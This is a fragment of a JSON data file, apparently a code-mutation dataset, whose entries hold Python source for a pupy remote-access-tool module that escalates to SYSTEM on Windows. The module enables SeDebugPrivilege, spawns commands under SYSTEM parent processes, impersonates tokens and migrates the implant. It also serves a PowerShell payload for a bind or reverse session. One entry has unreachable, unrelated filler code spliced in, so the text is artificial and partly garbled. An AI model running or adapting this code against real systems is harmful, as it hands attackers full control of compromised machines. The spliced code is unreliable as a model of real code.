timeout=args.timeout)\n        return\n    if args.powershell:\n        if completion and (not completion.is_set()):\n            self.info('Waiting for PowerLoader completion')\n            completion.wait()\n        if isBindLauncherForPs1:\n            self.success('You have to connect to the target manually on {0}: try \"connect --host {0}\" in pupy shell'.format(listeningAddressPortForBindPs1))\n        else:\n            self.success('Waiting for a connection (take few seconds, 1 min max)...')\n        if local_file:\n            os.remove(local_file)",
            "def run(self, args):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n        dp = [0, 1]\n        for i in range(2, n + 1):\n            dp.append(dp[i - 1] + dp[i - 2])\n        print(dp[n])\n\n        def dfs(node):\n            if node == None:\n                return []\n            left = dfs(node.left)\n            right = dfs(node.right)\n        length = 15\n        if length <= 0:\n            return []\n        elif length == 1:\n            return [0]\n        sequence = [0, 1]\n        while len(sequence) < length:\n            next_value = sequence[-1] + sequence[-2]\n            sequence.append(next_value)\n        return sequence\n    cmdToExecute = None\n    local_file = ''\n    isBindLauncherForPs1 = False\n    listeningAddressPortForBindPs1 = None\n    (launcherType, addressPort) = (self.client.desc['launcher'], self.client.desc['address'])\n    completion = None\n    if launcherType == 'bind':\n        self.info('The current pupy launcher is using a BIND connection. It is listening on {0} on the target'.format(addressPort))\n        isBindLauncherForPs1 = True\n        self.info('Consequently, powershell option is enabled automatically')\n        args.powershell = True\n    else:\n        self.info(\"The current pupy launcher is using a REVERSE connection (e.g. 'auto_proxy' or 'connect' launcher)\")\n        isBindLauncherForPs1 = False\n    if args.powershell:\n        self.info('A powershell payload will be used for getting a pupy session as SYSTEM')\n        clientConfToUse = None\n        if isBindLauncherForPs1:\n            self.info('Using powershell payload because the launcher on the target uses a bind connection. Launcher listens on {0}'.format(addressPort))\n            self.info('Bind launcher used. So a BIND ps1 will be used in child launcher. This ps1 will listen on your given port')\n            self.info('Be careful, you have to choose a port which is not used on the target!')\n            listeningPort = -1\n            while listeningPort == -1:\n                try:\n                    listeningPort = int(input('[?]\\xa0Give me the listening port to use on the target: '))\n                except Exception as e:\n                    self.warning('You have to give me a valid port. Try again. ({})'.format(e))\n            listeningAddress = addressPort.split(':')[0]\n            listeningAddressPortForBindPs1 = '{0}:{1}'.format(listeningAddress, listeningPort)\n            self.info('The ps1 script used for getting a pupy session as SYSTEM will be configured for listening on {0} on the target'.format(listeningAddressPortForBindPs1))\n            bindConf = self.client.get_conf()\n            bindConf['launcher_args'][bindConf['launcher_args'].index('--port') + 1] = str(listeningPort)\n            clientConfToUse = bindConf\n        else:\n            self.info('Using powershell payload because you have chosen this option. The launcher on the target uses a reverse connection')\n            clientConfToUse = self.client.get_conf()\n        (cmdToExecute, completion) = powerloader.serve(self, clientConfToUse)\n    if args.restart:\n        self.info('Trying to configure for running the current executable on the target as SYSTEM')\n        exe = self.client.desc['exec_path'].split('\\\\')\n        if exe[len(exe) - 1].lower() in ['powershell.exe', 'cmd.exe'] and exe[1].lower() == 'windows':\n            self.warning('It seems that your current process is %s' % self.client.desc['exec_path'])\n            self.warning('It is not recommended to restart it')\n            return\n        cmdToExecute = self.client.desc['exec_path']\n    if args.method == 'inheritance':\n        if not cmdToExecute:\n            cmdToExecute = args.execute\n        if cmdToExecute is None:\n            self.error('Application to execute with SYSTEM privileges should be specified with one of -x/-p/-r args')\n            return\n        try:\n            enable_privilege = self.client.remote('pupwinutils.security', 'EnablePrivilege', False)\n            enable_privilege('SeDebugPrivilege')\n            self.success('{} enabled'.format('SeDebugPrivilege'))\n        except Exception as e:\n            self.error('{} was not enabled: {}'.format('SeDebugPrivilege', e.args[1]))\n        create_new_process_from_ppid = self.client.remote('pupwinutils.security', 'create_new_process_from_ppid', False)\n        if args.parentID:\n            self.info('Using the Parent Process method on the pid {0}...'.format(args.parentID))\n            self.info('Command: {}'.format(cmdToExecute))\n            pid = create_new_process_from_ppid(int(args.parentID), cmdToExecute)\n            self.success('Created: pid={}, ppid={}'.format(pid, args.parentID))\n            return\n        else:\n            self.info('Getting information about all processes running on the target')\n            enum_processes = self.client.remote('pupwinutils.processes', 'enum_processes')\n            get_integrity_level = self.client.remote('pupwinutils.security', 'get_integrity_level', False)\n            self.info(\"Searching a process with a 'SYSTEM' integrity level\")\n            for aprocess in enum_processes():\n                integrityLevel = get_integrity_level(aprocess['pid'])\n                if not integrityLevel == 'System':\n                    continue\n                self.info(\"{0} (pid {1}) has a 'SYSTEM' integrity level, trying to use it\".format(aprocess['name'], aprocess['pid']))\n                try:\n                    pid = create_new_process_from_ppid(aprocess['pid'], cmdToExecute)\n                    self.success('Created: pid={}, ppid={}'.format(pid, aprocess['pid']))\n                    break\n                except Exception as e:\n                    self.error('Failed: {}'.format(' '.join((x for x in e.args if type(x) is str))))\n    elif args.method == 'impersonate':\n        if cmdToExecute is None:\n            cmdToExecute = args.execute or 'cmd.exe'\n        getsystem = self.client.remote('pupwinutils.security', 'getsystem', False)\n        proc_pid = getsystem(cmdToExecute)\n        self.success('Impersonated, pid={}. Migrating..'.format(proc_pid))\n        migrate(self, proc_pid, keep=args.keep, timeout=args.timeout)\n        return\n    if args.powershell:\n        if completion and (not completion.is_set()):\n            self.info('Waiting for PowerLoader completion')\n            completion.wait()\n        if isBindLauncherForPs1:\n            self.success('You have to connect to the target manually on {0}: try \"connect --host {0}\" in pupy shell'.format(listeningAddressPortForBindPs1))\n        else:\n            self.success('Waiting for a connection (take few seconds, 1 min max)...')\n        if local_file:\n            os.remove(local_file)"
        ]
    }
]